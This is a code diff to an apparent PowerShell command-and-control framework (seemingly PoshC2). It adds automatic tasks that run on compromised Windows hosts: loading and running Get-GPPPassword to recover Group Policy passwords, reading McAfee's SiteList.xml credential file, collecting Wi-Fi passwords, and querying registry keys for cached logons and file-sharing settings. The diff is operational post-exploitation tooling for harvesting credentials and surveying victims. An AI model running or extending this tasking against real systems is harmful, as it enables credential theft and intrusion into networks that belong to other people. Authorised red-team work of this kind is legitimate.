@@ -1025,6 +1025,7 @@ param
                 CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
                 CheckModuleLoaded "POwerup.ps1" $psrandomuri
                 CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
+                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
                 CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
                 $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
@@ -1045,11 +1046,23 @@ param
                 } | Out-Null
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
+                    Command   = "Get-GPPPassword"
+                } | Out-Null
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
                     Command   = "Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'"
                 } | Out-Null
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
                     Command   = "Get-WmiObject -Class Win32_Product"
+                } | Out-Null
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "Get-ItemProperty -Path `"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" -Name CachedLogonsCount"
+                } | Out-Null
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "Get-ItemProperty -Path `"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters`""
                 } | Out-Null
                 
                 $pscommand = "Get-RecentFiles; Get-WLANPass"
